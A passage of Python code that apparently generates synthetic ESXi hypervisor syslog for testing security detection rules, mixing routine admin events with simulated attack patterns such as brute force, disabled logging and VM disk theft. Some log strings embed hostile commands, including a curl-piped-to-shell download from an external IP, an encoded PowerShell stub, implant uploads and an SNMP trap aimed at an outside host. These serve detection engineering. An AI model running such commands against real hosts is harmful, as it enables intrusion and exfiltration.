                           f"Event {ev} : Permission updated for {target} on host, "
                           f"role NoAccess, propagating", opid=_opid(), user=actor)
    if action == "lockout":
        n = random.choice([60, 120, 300, 900])
        m = random.randint(5, 10)
        return [
            _hostd_line(config, host, "warning", "Vimsvc.ha-eventmgr",
                        f"Event {ev} : Remote access for ESXi local user account "
                        f"'{target}' has been locked for {n} seconds after {m} failed "
                        f"login attempts", opid=_opid(), user=target),
            _vobd_line(config, host, "vob.user.account.locked",
                       f"Account {target} has been locked after {m} failed login attempts."),
        ]
    if action == "role_assign":
        role = random.choice(["ReadOnly", "Admin"])
        return _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                           f"Event {ev} : Permission created for {target} on host, "
                           f"role {role}, propagating", opid=_opid(), user=actor)
    if action == "role_remove":
        return _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                           f"Event {ev} : Permission removed for {target} on host",
                           opid=_opid(), user=actor)
    if action == "password":
        return _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                           f"Event {ev} : Password was changed for account {target} "
                           f"on host {host}", opid=_opid(), user=actor)
    return _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                       f"Event {ev} : Account {target} was reviewed on host {host}",
                       opid=_opid(), user=actor)


def _b_stale_account_login(config, host, session_context):
    """A login ATTEMPT against an account that should not work — a DISABLED account (still
    present, access revoked) or a DELETED/offboarded account (no longer present). Distinct
    signals: the disabled case authenticates the user but PAM's account module denies it
    ('account is disabled'); the deleted case never resolves the user ('Invalid user' /
    'user unknown' / 'no such user'). Benign-weighted (stale automation creds, an admin
    fat-fingering an offboarded name) but security-relevant on its own. Covers SSH and
    the local console."""
    src = random_external_ip(config) if random.random() < 0.5 else _mgmt_ip(config)
    ssh = random.random() < 0.6
    ev = random.randint(900000, 999999)

    if random.random() < 0.5:
        # DISABLED account — exists, access revoked.
        u = random.choice(_disabled_accounts(config))
        if ssh:
            port = random.randint(30000, 60000)
            return [
                _sshd_line(config, host, f"Failed password for {u} from {src} port {port} ssh2"),
                _sshd_line(config, host, f"account {u} is disabled", pam="account"),
                _vobd_line(config, host, "vob.user.ssh.session.failed",
                           f"SSH login has failed for '{u}@{src}'."),
            ]
        return _hostd_line(config, host, "warning", "Vimsvc.ha-eventmgr",
                           f"Event {ev} : Cannot login {u}@127.0.0.1 (account disabled)",
                           opid=_opid(), user=u)

    # DELETED / offboarded account — no such user.
    u = random.choice(_former_accounts(config))
    if ssh:
        port = random.randint(30000, 60000)
        return [
            _sshd_line(config, host, f"Invalid user {u} from {src} port {port}"),
            _sshd_line(config, host, f"check pass; user unknown", pam="auth"),
            _sshd_line(config, host, f"Failed password for invalid user {u} from {src} port {port} ssh2"),
            _vobd_line(config, host, "vob.user.ssh.session.failed",
                       f"SSH login has failed for '{u}@{src}'."),
        ]
    return _hostd_line(config, host, "warning", "Vimsvc.ha-eventmgr",
                       f"Event {ev} : Cannot login {u}@127.0.0.1 (no such user)",
                       opid=_opid())


# ── Policy / configuration changes ─────────────────────────────────────────────

# Benign values for the advanced settings admins actually tune: shell timeouts, password
# and lockout policy, log levels, the DCUI banner, BPDU filter, session timeout. (The
# syslog-logHost clear is the remote_syslog_disabled threat; the same mechanism carries
# ordinary tuning here.)
_BENIGN_ADVANCED_SETTINGS = [
    ("UserVars.ESXiShellTimeOut", "900"),
    ("UserVars.ESXiShellInteractiveTimeOut", "900"),
    ("UserVars.HostClientSessionTimeout", "900"),
    ("Security.AccountLockFailures", "5"),
    ("Security.AccountUnlockTime", "900"),
    ("Security.PasswordQualityControl", "retry=3 min=disabled,disabled,disabled,7,7"),
    ("Security.PasswordMaxDays", "90"),
    ("Config.HostAgent.log.level", "info"),
    ("Syslog.global.logLevel", "info"),
    ("Annotations.WelcomeMessage", "Authorized use only"),
    ("Net.BlockGuestBPDU", "1"),
    ("UserVars.SuppressShellWarning", "0"),
]

_PORTGROUPS = ["VM Network", "Prod-VLAN110", "Mgmt-VLAN10", "vMotion", "Backup-VLAN30"]


def _b_config_change(config, host, session_context):
    """Routine host policy / configuration changes by the ops team: advanced settings
    (password / lockout / shell-timeout policy), lockdown mode, NTP / DNS, vSwitch
    port-group security policy, firewall allowed-IP lists, role definitions. hostd records
    both the low-level 'Set called with key' and the higher-level Event."""
    user, src = _resolve_admin(config, session_context)
    ev = random.randint(900000, 999999)
    kind = random.choices(["advanced", "lockdown", "ntp_dns", "portgroup", "fw_allowed", "role"],
                          weights=[34, 10, 14, 14, 14, 14], k=1)[0]
    if kind == "advanced":
        key, val = random.choice(_BENIGN_ADVANCED_SETTINGS)
        return [
            _hostd_line(config, host, "info", "Vimsvc", f'Set called with key "{key}", value "{val}"',
                        opid=_opid(), user=user),
            _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                        f"Event {ev} : Advanced option {key} changed to '{val}' on {host} "
                        f"by {user}@{src}", opid=_opid(), user=user),
        ]
    if kind == "lockdown":
        # Admins drop lockdown for a maintenance task and restore it afterwards.
        a, b = random.choice([("Disabled", "Normal"), ("Disabled", "Normal"), ("Normal", "Disabled")])
        return _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                           f"Event {ev} : Lockdown mode of host {host} changed from {a} to {b} "
                           f"by {user}@{src}", opid=_opid(), user=user)
    if kind == "ntp_dns":
        if random.random() < 0.5:
            servers = random.choice(["10.0.10.10, 10.0.20.10", "time.google.com, pool.ntp.org"])
            body = f"NTP server list updated to [{servers}] on {host}"
        else:
            body = (f"DNS configuration changed on {host}: servers 10.0.10.10, 10.0.20.10, "
                    f"search domain corp.examplecorp.local")
        return _hostd_line(config, host, "info", "Hostsvc", body, opid=_opid(), user=user)
    if kind == "portgroup":
        pg = random.choice(_PORTGROUPS)
        policy = random.choice(["promiscuous mode", "forged transmits", "MAC address changes"])
        return _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                           f"Event {ev} : Security policy on port group '{pg}' updated: {policy} "
                           f"set to Reject by {user}@{src}", opid=_opid(), user=user)
    if kind == "fw_allowed":
        ruleset = random.choice(["sshServer", "vSphereClient", "webAccess", "CIMHttpsServer"])
        subnet = mgmt_plane.conf(config)["admin_subnet"]
        return _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                           f"Event {ev} : Firewall ruleset {ruleset} allowed IP list set to "
                           f"{subnet} on {host} by {user}@{src}", opid=_opid(), user=user)
    role = random.choice(["BackupOperator", "MonitoringReadOnly", "VMOperator", "HelpdeskConsole"])
    verb = random.choice(["created", "modified"])
    return _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                       f"Event {ev} : Role {role} was {verb} on host {host} by {user}@{src}",
                       opid=_opid(), user=user)


def _b_service_policy(config, host, session_context):
    """A host service's startup policy or running state changed — SSH / ESXi Shell / NTP /
    CIM / SNMP start policy, or a start / stop / restart."""
    user, src = _resolve_admin(config, session_context)
    svc, policies = random.choice([
        ("TSM-SSH", ["on", "off", "automatic"]),
        ("TSM", ["on", "off"]),              # ESXi Shell
        ("ntpd", ["on", "automatic"]),
        ("sfcbd-watchdog", ["off", "on"]),   # CIM
        ("snmpd", ["off", "on"]),
    ])
    ev = random.randint(900000, 999999)
    if random.random() < 0.6:
        pol = random.choice(policies)
        body = f"Event {ev} : Service {svc} startup policy changed to '{pol}' on {host}"
    else:
        act = random.choice(["started", "stopped", "restarted"])
        body = f"Event {ev} : Service {svc} {act} on {host}"
    return _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr", body, opid=_opid(), user=user)


def _b_patch_activity(config, host, session_context):
    """Benign patch / VIB maintenance — the legitimate counterpart to the VIB-bypass
    threat: a signed VIB install and an image-profile compliance scan via esxupdate."""
    user, src = _resolve_admin(config, session_context)
    pri = _pri(_FAC_DAEMON, "info")
    pid = random.randint(2100000, 2600000)
    if random.random() < 0.5:
        vib = random.choice(["VMware_bootbank_esx-base", "VMW_bootbank_nvme-pcie",
                             "VMware_bootbank_esx-update", "VMW_bootbank_vmkusb"])
        return (f"<{pri}>{_ts()} {host} esxupdate[{pid}]: esxupdate: INFO: Installed VIB "
                f"{vib} (acceptance level VMwareCertified)")
    return (f"<{pri}>{_ts()} {host} esxupdate[{pid}]: esxupdate: INFO: Scanning image "
            f"profile against depot; host is compliant")


# ── Runtime activity ────────────────────────────────────────────────────────────

def _b_vcenter_sync(config, host, session_context):
    """vCenter <-> host management traffic over vpxa: vpxuser login / logout, inventory
    and task syncs, heartbeat, connect / disconnect / reconnect. On a managed host this is
    the bulk of authenticated activity — most hostd logins are vpxuser, not people."""
    vc_name, vc_ip = _vcenter(config)
    ev = random.randint(900000, 999999)
    kind = random.choices(
        ["heartbeat", "vpxa_task", "vpxuser_login", "vpxuser_logout", "connected",
         "disconnected", "reconnect"],
        weights=[30, 30, 12, 8, 6, 6, 8], k=1)[0]
    if kind == "heartbeat":
        return _hostd_line(config, host, "verbose", "vpxLro",
                           f"Sent heartbeat to vCenter Server {vc_ip}; sequence "
                           f"{random.randint(1000, 999999)}",
                           opid=f"hb-{random.randint(0, 0xffffff):06x}")
    if kind == "vpxa_task":
        op = random.choice(["vim.host.StorageSystem.refresh", "vim.host.NetworkSystem.refresh",
                            "vpxapi.VpxaService.retrieveChanges", "vim.PerformanceManager.queryStats",
                            "vim.HostSystem.retrieveInternalConfigManager"])
        return _hostd_line(config, host, "verbose", "vpxLro",
                           f"Task {op} invoked by vCenter {vc_name} completed",
                           opid=f"vpxd-{random.randint(0, 0xffffff):06x}")
    if kind == "vpxuser_login":
        return _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                           f"Event {ev} : User vpxuser@{vc_ip} logged in as VMware-client/8.0.0",
                           opid=_opid(), user="vpxuser")
    if kind == "vpxuser_logout":
        return _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                           f"Event {ev} : User vpxuser@{vc_ip} logged out (login time: {_ts()}, "
                           f"number of API invocations: {random.randint(50, 4000)}, user agent: "
                           f"VMware-client/8.0.0)", opid=_opid(), user="vpxuser")
    if kind == "connected":
        return _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                           f"Event {ev} : Host {host} is connected to vCenter Server {vc_ip}",
                           opid=_opid())
    if kind == "disconnected":
        return _hostd_line(config, host, "warning", "Vimsvc.ha-eventmgr",
                           f"Event {ev} : Host {host} has lost connection to vCenter Server {vc_ip}",
                           opid=_opid())
    return _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                       f"Event {ev} : vpxa reconnected to vCenter Server {vc_ip}", opid=_opid())


def _b_backup_job(config, host, session_context):
    """The scheduled VM backup: the backup proxy snapshots a VM, reads it over NFC, then
    removes the snapshot. The BENIGN baseline the vm_disk_export threat stands against —
    same NFC file-read, but a known proxy IP and service account."""
    proxy_ip, acct = _backup_proxy(config)
    vm = random.choice(_vms(config))
    ds = random.choice(_datastores(config))
    e = lambda: random.randint(900000, 999999)
    return [
        _hostd_line(config, host, "info", f"Vmsvc.vm:/vmfs/volumes/{vm}",
                    f"Create Snapshot: VEEAM BACKUP TEMP, memory=false, quiescent=true "
                    f"state=5 vm={vm}", opid=_opid(), user=acct),
        _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                    f"Event {e()} : File download from path /vmfs/volumes/{ds}/{vm}/{vm}-flat.vmdk "
                    f"was initiated from {proxy_ip} by {acct}", opid=_opid(), user=acct),
        _hostd_line(config, host, "info", f"Vmsvc.vm:/vmfs/volumes/{vm}",
                    f"Remove Snapshot: VEEAM BACKUP TEMP vm={vm}", opid=_opid(), user=acct),
    ]


def _b_datastore_ops(config, host, session_context):
    """Routine datastore / storage administration — HBA rescan, NFS mount, capacity, grow."""
    ds = random.choice(_datastores(config))
    ev = random.randint(900000, 999999)
    iso = random.choice(["ubuntu-24.04.iso", "Win2022.iso", "rhel9.iso", "vcenter-template.ovf"])
    body = random.choice([
        f"Event {ev} : Rescan of all HBAs on {host} completed",
        f"Event {ev} : NFS datastore {ds} mounted on {host}",
        f"Event {ev} : Datastore {ds} on {host} is {random.randint(60, 88)}% full",
        f"Event {ev} : VMFS volume {ds} was expanded on {host}",
        f"Event {ev} : File upload to path /vmfs/volumes/{ds}/ISO/{iso} was initiated from "
        f"{mgmt_plane.admin_source(config)} by svc_vcenter",
    ])
    sev = "warning" if ("% full" in body and int(body.split("% full")[0].split()[-1]) >= 85) else "info"
    return _hostd_line(config, host, sev, "Vmsvc.vm", body, opid=_opid())


def _b_guest_ops(config, host, session_context):
    """Routine VMware Tools / guest interaction — the legitimate baseline for the
    guest_ops_exec threat (which pushes programs/files INTO guests). Here: Tools-driven
    guest shutdown/restart, time sync, heartbeat, and Tools upgrades."""
    vm = random.choice(_vms(config))
    ev = random.randint(900000, 999999)
    body = random.choice([
        f"Event {ev} : Guest OS of {vm} on {host} was gracefully shut down via VMware Tools",
        f"Event {ev} : Guest OS of {vm} on {host} was restarted via VMware Tools",
        f"Event {ev} : VMware Tools on {vm} ({host}) was upgraded to the current version",
        f"Event {ev} : Time synchronized with guest {vm} via VMware Tools on {host}",
        f"Event {ev} : VMware Tools heartbeat on {vm} ({host}) is green",
    ])
    return _hostd_line(config, host, "info", f"Vmsvc.vm:/vmfs/volumes/{vm}", body, opid=_opid())


# Benign mix — (generator, weight, human). `human` events are admin / config / login
# driven and cluster in business hours; the rest are machine-driven and run around the
# clock, dominating off-hours (see _benign's activity_weight gate). Weights keep the
# ambient poll + vCenter sync on top while every named activity still appears reliably.
_BENIGN_MIX = [
    (_b_vpxa_poll,          18, False),
    (_b_vcenter_sync,       14, False),  # vpxuser/vpxa sync — bulk of managed-host auth
    (_b_shell_command,      12, False),  # common-command baseline for the rarity analytics
    (_b_vmkernel,           11, False),  # storage path/SCSI/APD/PDL, NIC link, sensors
    (_b_vm_power,            9, False),  # VM power on/off/suspend/reset/guest shutdown
    (_b_shell_login,         9, True),   # SSH / ESXi Shell / DCUI logins + logouts
    (_b_config_change,       7, True),   # advanced settings / lockdown / NTP / fw / role
    (_b_vm_lifecycle,        6, True),   # create/clone/reconfigure/vMotion/snapshot
    (_b_ssh_service_toggle,  5, True),   # SSH / ESXi Shell enabled + disabled
    (_b_vsphere_session,     5, True),   # vSphere Client / API login + logout
    (_b_ha_drs,              5, False),  # vSphere HA (fdm) + DRS load-balancing
    (_b_service_control,     4, False),  # service restart / cert renew / NTP / ruleset
    (_b_service_health,      4, False),
    (_b_backup_job,          4, False),  # nightly snapshot + NFC read + remove
    (_b_account_admin,       4, True),   # create/disable/delete/lockout/password/role
    (_b_service_policy,      3, True),   # service startup policy + start/stop/restart
    (_b_storage,             3, False),
    (_b_datastore_ops,       3, False),  # rescan / NFS mount / capacity / grow / ISO upload
    (_b_guest_ops,           3, False),  # VMware Tools guest ops (baseline for guest_ops_exec)
    (_b_stale_account_login, 3, False),  # login attempts vs disabled + deleted accounts
    (_b_snapshot,            3, False),
    (_b_maintenance_mode,    3, True),
    (_b_patch_activity,      2, True),   # signed VIB install / image-profile scan
    (_b_crond,               3, False),
]


def _benign(config, session_context=None):
    host = random.choice(_hosts(config))
    # Business-hours gate: human admin / config-change / login events cluster in work
    # hours; machine events (poll, kernel, vCenter sync, backup, cron) run around the
    # clock and dominate off-hours. activity_weight() is the shared org-time curve.
    if random.random() > activity_weight():
        pool = [(f, w) for f, w, human in _BENIGN_MIX if not human]
    else:
        pool = [(f, w) for f, w, human in _BENIGN_MIX]
    fns = [f for f, _ in pool]
    weights = [w for _, w in pool]
    fn = random.choices(fns, weights=weights, k=1)[0]
    return fn(config, host, session_context)


# ── Threat generators ─────────────────────────────────────────────────────────

def _ssh_brute_force(config, session_context=None):
    """A burst of failed SSH authentications from one external host, then (usually) a
    final success — the classic ESXi SSH brute-force / ransomware-foothold pattern.
    Populates username, source IP and failure outcome across sshd + vobd so an
    authentication brute-force analytic has the fields it keys on."""
    host = random.choice(_hosts(config))
    attacker = rare_external_ip()
    users = ["root", "administrator", "admin", "root", "root", "vmware"]
    logs = []
    for _ in range(random.randint(12, 25)):
        u = random.choice(users)
        port = random.randint(30000, 60000)
        if u in ("administrator", "admin", "vmware") and random.random() < 0.5:
            logs.append(_sshd_line(config, host, f"Invalid user {u} from {attacker} port {port}"))
        else:
            logs.append(_sshd_line(config, host,
                                   f"Failed password for {'invalid user ' if u != 'root' else ''}"
                                   f"{u} from {attacker} port {port} ssh2"))
        logs.append(_vobd_line(config, host, "vob.user.ssh.session.failed",
                               f"SSH login has failed for '{u}@{attacker}'."))
    # A foothold most of the time: the brute force lands.
    if random.random() < 0.7:
        port = random.randint(30000, 60000)
        logs.append(_sshd_line(config, host, f"Accepted password for root from {attacker} port {port} ssh2"))
        logs.append(_sshd_line(config, host, f"session opened for user root by (uid=0)", pam=True))
        logs.append(_hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                                f"Event {random.randint(900000, 999999)} : "
                                f"SSH session was opened for 'root@{attacker}'.",
                                opid=_opid(), user="root"))
    return logs


def _root_login_rare_source(config, session_context=None):
    """Successful interactive root logon from a rare external source — anomalous/first
    interactive access. hostd records the accepted auth + the login Event with the
    client IP and username the identity analytics baseline."""
    host = random.choice(_hosts(config))
    src = rare_external_ip()
    logs = [
        _hostd_line(config, host, "info", "Default",
                    f"Accepted password for user root from {src}", opid=_opid()),
        _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                    f"Event {random.randint(900000, 999999)} : "
                    f"User root@{src} logged in as pyvmomi", opid=_opid(), user="root"),
    ]
    return logs


def _ssh_service_enabled(config, session_context=None):
    """ESXi Shell / SSH service turned on — a near-universal precursor in ESXi
    ransomware intrusions. Config-change + vob correlator events."""
    host = random.choice(_hosts(config))
    user, src = _resolve_admin(config, session_context)
    svc = random.choice(["SSH", "ESXi Shell"])
    vob = "vob.user.esxshell.ssh.enabled" if svc == "SSH" else "vob.user.esxshell.enabled"
    logs = [
        _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                    f"Event {random.randint(900000, 999999)} : {svc} access has been "
                    f"enabled on {host} by {user}@{src}", opid=_opid(), user=user),
        _vobd_line(config, host, vob, f"{svc} access has been enabled."),
    ]
    # Attackers also flip on full administrator/DCUI access and drop lockdown mode.
    if random.random() < 0.5:
        logs.append(_hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                    f"Event {random.randint(900000, 999999)} : Administrator access to "
                    f"the host has been enabled", opid=_opid(), user=user))
    return logs


def _local_account_created(config, session_context=None):
    """A new local account added on the host and granted the Admin role — persistence /
    privilege. Identity-change events the ESXi modeling rule maps to identity fields."""
    host = random.choice(_hosts(config))
    actor, src = _resolve_admin(config, session_context)
    new_user = random.choice(["support", "vmsvc2", "helpdesk", "backupsvc", "svc_adm"])
    return [
        _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                    f"Event {random.randint(900000, 999999)} : Account {new_user} was "
                    f"created on host {host}", opid=_opid(), user=actor),
        _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                    f"Event {random.randint(900000, 999999)} : Permission created for "
                    f"{new_user} on host, role Admin, propagating", opid=_opid(), user=actor),
        _vobd_line(config, host, "vob.user.account.created",
                   f"Account {new_user} was created on the host."),
    ]


def _mass_vm_power_off(config, session_context=None):
    """Many VMs powered off / snapshots removed in a short window — the destructive
    stage of an ESXi ransomware event. Virtualization-story + process fields."""
    host = random.choice(_hosts(config))
    actor, src = _resolve_admin(config, session_context, external=random.random() < 0.5)
    vms = _vms(config)[:]
    random.shuffle(vms)
    logs = []
    for vm in vms[:random.randint(4, len(vms))]:
        logs.append(_hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                                f"Event {random.randint(900000, 999999)} : {vm} on {host} "
                                f"is powered off by {actor}@{src}", opid=_opid(), user=actor))
        if random.random() < 0.5:
            logs.append(_hostd_line(config, host, "info", f"Vmsvc.vm:/vmfs/volumes/{vm}",
                                    f"Remove Snapshot: all snapshots vm={vm}", opid=_opid()))
    return logs


def _remote_syslog_disabled(config, session_context=None):
    """Remote syslog forwarding turned off — defense evasion / anti-forensics. By
    definition the last ESXi event before the host goes dark to the collector. Emits the
    `Set called with key "Syslog.global.logHost"` hostd form that SIEM content keys on,
    plus the advanced-option change event and the vob correlator."""
    host = random.choice(_hosts(config))
    actor, src = _resolve_admin(config, session_context)
    return [
        _hostd_line(config, host, "info", "Vimsvc",
                    'Set called with key "Syslog.global.logHost", value ""',
                    opid=_opid(), user=actor),
        _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                    f"Event {random.randint(900000, 999999)} : Advanced option "
                    f"Syslog.global.logHost changed from 'tcp://collector:514' to '' "
                    f"by {actor}@{src}", opid=_opid(), user=actor),
        _vobd_line(config, host, "vob.user.syslog.remote.disabled",
                   "Remote syslog logging has been disabled."),
    ]


def _vm_disk_export(config, session_context=None):
    """VM disk / config downloaded off the datastore over the NFC datastore-browser path
    — VM theft (exfiltration of whole guests). hostd logs the file-download initiation;
    SIEM content keys on 'File download from path ... was initiated from'."""
    host = random.choice(_hosts(config))
    actor, src = _resolve_admin(config, session_context, external=random.random() < 0.5)
    ds = random.choice(_datastores(config))
    logs = []
    for vm in random.sample(_vms(config), k=random.randint(2, 4)):
        ext = random.choice(["-flat.vmdk", ".vmdk", ".vmx", ".nvram"])
        logs.append(_hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                    f"Event {random.randint(900000, 999999)} : File download from path "
                    f"/vmfs/volumes/{ds}/{vm}/{vm}{ext} was initiated from {src} by {actor}",
                    opid=_opid(), user=actor))
    return logs


def _uncommon_host_command(config, session_context=None):
    """Interactive ESXi shell running UNCOMMON admin/discovery/evasion/destructive
    commands — the direct trigger for 'Uncommon command executed on a virtualization
    host' / 'Uncommon command was executed on a device'. Draws from the rare pool; the
    benign shell_command / crond events supply the common-command training baseline."""
    host = random.choice(_hosts(config))
    logs = []
    for cmd in random.sample(_RARE_COMMANDS, k=random.randint(2, 4)):
        if "%s" in cmd:
            cmd = cmd % rare_external_ip()
        logs.append(_cmd_line(config, host, cmd))
    return logs


def _vuln_scan(config, session_context=None):
    """A vulnerability scanner / automated recon tool probing the host's management
    surface from one external IP — the enumeration-plus-login-probe pattern (Nessus /
    Qualys / OpenVAS / opportunistic internet scan). Spans the services a scanner hits:
      rhttpproxy  many short-lived connections to /sdk /mob /ui /folder, SSL handshake
                  failures (TLS/cipher probing).
      sshd        pre-auth noise — no identification string, pre-auth closes, no matching
                  cipher/kex — plus a few default-credential login attempts.
      hostd       rejected SOAP/SDK API logins (default creds against the API).
    Non-analytic for VMware syslog (no command runs on the host), but a strong hunting /
    cross-source correlation signal — the same scanner IP lights up the firewall too."""
    host = random.choice(_hosts(config))
    scanner = rare_external_ip()
    endpoints = ["/sdk", "/mob", "/ui", "/folder", "/health", "/sdk/vimServiceVersions.xml",
                 "/cgi-bin/esxupdate", "/ticket"]
    default_users = ["root", "root", "admin", "administrator", "vmware", "dcui"]
    logs = []
    for _ in range(random.randint(14, 26)):
        kind = random.choices(["proxy", "ssl", "ssh_preauth", "ssh_login", "api_login", "cim"],
                              weights=[30, 16, 18, 14, 14, 8], k=1)[0]
        port = random.randint(30000, 60000)
        if kind == "proxy":
            logs.append(_rhttpproxy_line(config, host, f"Proxy Req {random.randint(10000, 99999)}",
                        f"Connection from {scanner}:{port} accepted to endpoint {random.choice(endpoints)}"))
        elif kind == "ssl":
            logs.append(_rhttpproxy_line(config, host, "SSL",
                        f"SSL Handshake failed for stream <io_obj p:0x0, h:-1, <TCP '{scanner} : {port}'>>, "
                        f"error: {random.choice(['unsupported protocol', 'no shared cipher', 'bad certificate'])}",
                        severity="warning"))
        elif kind == "ssh_preauth":
            logs.append(_sshd_line(config, host, random.choice([
                f"Did not receive identification string from {scanner} port {port}",
                f"Connection closed by {scanner} port {port} [preauth]",
                f"Unable to negotiate with {scanner} port {port}: no matching key exchange method found.",
                f"banner exchange: Connection from {scanner} port {port}: invalid format",
            ])))
        elif kind == "ssh_login":
            u = random.choice(default_users)
            logs.append(_sshd_line(config, host,
                        (f"Invalid user {u} from {scanner} port {port}" if u in ("admin", "administrator", "vmware", "dcui")
                         else f"Failed password for {u} from {scanner} port {port} ssh2")))
        elif kind == "api_login":
            u = random.choice(default_users)
            logs.append(_hostd_line(config, host, "warning", "Vimsvc.ha-eventmgr",
                        f"Event {random.randint(900000, 999999)} : Rejected password for user "
                        f"{u}@{scanner} (SOAP session)", opid=_opid()))
        else:  # cim
            logs.append(_rhttpproxy_line(config, host, f"Proxy Req {random.randint(10000, 99999)}",
                        f"Connection from {scanner}:{port} rejected to CIM endpoint :5989 (service not enabled)",
                        severity="warning"))
    return logs


# ── Top-tier custom-rule targets ───────────────────────────────────────────────
# No shipped XSIAM analytic covers these, but each has clear log evidence and is a
# strong manual correlation / BIOC target. Where a benign counterpart exists (guest ops,
# datastore upload, disk add, planned reboot, portgroup Reject), the rule has a baseline
# to stand out against.

def _guest_ops_exec(config, session_context=None):
    """Guest Operations (VIX) API abuse — programs/files pushed INTO guest VMs from the
    management plane (hypervisor -> guest execution / lateral movement). hostd logs the
    guest-op invocation with the in-guest auth and the program/file."""
    host = random.choice(_hosts(config))
    actor, src = _resolve_admin(config, session_context, external=random.random() < 0.4)
    logs = []
    for vm in random.sample(_vms(config), k=random.randint(2, 4)):
        op = random.choice([
            "StartProgramInGuest: guestAuth=Administrator program='C:\\Windows\\System32\\"
            "cmd.exe /c powershell -enc JABzAD0A...'",
            f"StartProgramInGuest: guestAuth=root program='/bin/sh -c curl http://{rare_external_ip()}/x|sh'",
            "InitiateFileTransferToGuest: guestAuth=root path='/tmp/.x/implant' size="
            f"{random.randint(10**5, 10**7)}",
            "ListProcessesInGuest: guestAuth=Administrator",
        ])
        logs.append(_hostd_line(config, host, "info", f"Vmsvc.vm:/vmfs/volumes/{vm}",
                    f"Guest operation {op} on vm={vm} invoked by {actor}@{src}",
                    opid=_opid(), user=actor))
    return logs


def _datastore_upload(config, session_context=None):
    """Suspicious file UPLOAD to a datastore over NFC — staging a webshell / ELF / script
    / rogue ISO on shared storage. The upload counterpart to vm_disk_export; the benign
    ISO/template upload in _b_datastore_ops is the baseline."""
    host = random.choice(_hosts(config))
    actor, src = _resolve_admin(config, session_context, external=random.random() < 0.5)
    ds = random.choice(_datastores(config))
    logs = []
    for _ in range(random.randint(1, 3)):
        fn = random.choice(["/.sshdoor/implant.sh", "/.hidden/encryptor", "/x.py",
                            "/webshell.php", "/tools/nc", "/ISO/rogue-boot.iso"])
        logs.append(_hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                    f"Event {random.randint(900000, 999999)} : File upload to path "
                    f"/vmfs/volumes/{ds}{fn} was initiated from {src} by {actor}",
                    opid=_opid(), user=actor))
    return logs


def _vm_disk_attach(config, session_context=None):
    """A VM reconfigured to attach ANOTHER VM's virtual disk — offline data theft (mount a
    DC / vault VM's -flat.vmdk onto a scratch VM to read it raw, bypassing the guest OS)."""
    host = random.choice(_hosts(config))
    actor, src = _resolve_admin(config, session_context)
    vms = _vms(config)[:]
    random.shuffle(vms)
    victim = vms[0]
    attacker_vm = vms[1] if len(vms) > 1 else "scratch-vm"
    ds = random.choice(_datastores(config))
    return [_hostd_line(config, host, "info", f"Vmsvc.vm:/vmfs/volumes/{attacker_vm}",
            f"Reconfigured {attacker_vm} on {host}: added existing disk "
            f"/vmfs/volumes/{ds}/{victim}/{victim}-flat.vmdk (mode independent-nonpersistent) "
            f"by {actor}@{src}", opid=_opid(), user=actor)]


def _kernel_module_load(config, session_context=None):
    """Loading a non-standard / unsigned VMkernel module — rootkit / backdoor staging
    (VIRTUALPITA-style). esxcli module load + a vmkernel load warning for a module outside
    the shipped signed set."""
    host = random.choice(_hosts(config))
    mod = random.choice(["vmwdbg", "nsx-shim", "vmkmgmt_hook", "procfs_hook", "hostd_aux"])
    return [
        _cmd_line(config, host, f"/bin/esxcli system module load -m {mod}"),
        _vmkernel_line(config, host, "Mod",
                       f"Loaded module {mod} from /tmp/.x/{mod}.ko (not in VMware signed set)",
                       severity="warning"),
    ]


def _promiscuous_mode(config, session_context=None):
    """A port group's security policy set to ACCEPT promiscuous mode / forged transmits —
    a virtual network tap for sniffing guest traffic. The benign baseline (_b_config_change)
    only ever sets these to Reject, so Accept is the signal."""
    host = random.choice(_hosts(config))
    actor, src = _resolve_admin(config, session_context)
    pg = random.choice(_PORTGROUPS)
    policy = random.choice(["promiscuous mode", "forged transmits", "MAC address changes"])
    return _hostd_line(config, host, "warning", "Vimsvc.ha-eventmgr",
        f"Event {random.randint(900000, 999999)} : Security policy on port group '{pg}' "
        f"updated: {policy} set to Accept by {actor}@{src}", opid=_opid(), user=actor)


def _unplanned_reboot(config, session_context=None):
    """Host reboot / shutdown with no maintenance-mode window — ransomware rebooting into
    its payload, or a disruptive availability action (VMs not cleanly stopped)."""
    host = random.choice(_hosts(config))
    actor, src = _resolve_admin(config, session_context, external=random.random() < 0.4)
    act = "reboot" if random.random() < 0.6 else "shutdown"
    verb = "rebooted" if act == "reboot" else "shut down"
    return [
        _hostd_line(config, host, "warning", "Vimsvc.ha-eventmgr",
            f"Event {random.randint(900000, 999999)} : Host {host} is being {verb} by "
            f"{actor}@{src} (host not in maintenance mode)", opid=_opid(), user=actor),
        _vmkernel_line(config, host, "Reboot",
            f"User-initiated {act}; {random.randint(1, 40)} running VMs were not cleanly "
            f"powered off", severity="warning"),
    ]


def _snmp_external_target(config, session_context=None):
    """SNMP enabled with its trap target set to an EXTERNAL host — turning host telemetry
    into an exfil / C2 channel."""
    host = random.choice(_hosts(config))
    actor, src = _resolve_admin(config, session_context)
    ext = rare_external_ip()
    return [
        _cmd_line(config, host, f"/bin/esxcli system snmp set -e true -c public -t {ext}@162/public"),
        _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
